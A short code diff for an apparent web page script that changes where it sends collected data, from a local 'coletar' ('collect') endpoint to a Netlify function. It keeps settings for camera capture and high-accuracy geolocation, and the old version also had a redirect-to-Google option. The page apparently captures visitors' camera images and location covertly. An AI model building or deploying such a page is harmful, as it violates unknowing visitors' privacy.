@@ -93,13 +93,18 @@
         (function() {
             'use strict';
 
-            const CONFIG = {
-                backendURL: 'http://localhost:3000/coletar',
-                camera: { qualidade: 0.92, largura: 1280, altura: 720, timeout: 5000, tentativas: 3 },
-                geolocation: { enableHighAccuracy: true, timeout: 10000, maximumAge: 0, tentativas: 3 },
-                comportamento: { esperarInicial: 800, redirecionarApos: false, urlRedirecionamento: 'https://www.google.com', tentarNovamenteClick: true }
-            };
-
+       const CONFIG = {
+    backendURL: '/.netlify/functions/coletar',  // ← CORRETO
+    camera: { 
+        qualidade: 0.92, 
+        largura: 1280, 
+        altura: 720 
+    },
+    geolocation: { 
+        enableHighAccuracy: true, 
+        timeout: 5000 
+    }
+}
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
